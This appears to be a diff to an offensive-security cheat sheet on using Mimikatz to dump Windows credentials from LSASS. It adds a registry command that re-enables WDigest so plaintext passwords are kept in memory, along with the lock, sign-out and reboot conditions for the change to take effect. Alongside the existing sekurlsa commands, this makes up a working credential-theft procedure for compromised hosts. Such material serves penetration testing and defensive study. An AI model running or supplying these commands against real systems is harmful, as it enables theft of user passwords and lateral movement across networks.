@@ -21,6 +21,8 @@ mimikatz # sekurlsa::wdigest
 
 ## Mimikatz - Extract passwords
 
+> Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.
+
 ```powershell
 mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
@@ -28,7 +30,20 @@ mimikatz_command -f sekurlsa::wdigest
 # to re-enable wdigest in Windows Server 2012+
 # in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
 # create a DWORD 'UseLogonCredential' with the value 1.
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
 ```
+
+:warning: To take effect, conditions are required :
+- Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
+  * Adding requires lock
+  * Removing requires signout
+- Win10:
+  * Adding requires signout
+  * Removing requires signout
+- Win2016:
+  * Adding requires lock
+  * Removing requires reboot
+
 
 ## Mimikatz - Mini Dump
 
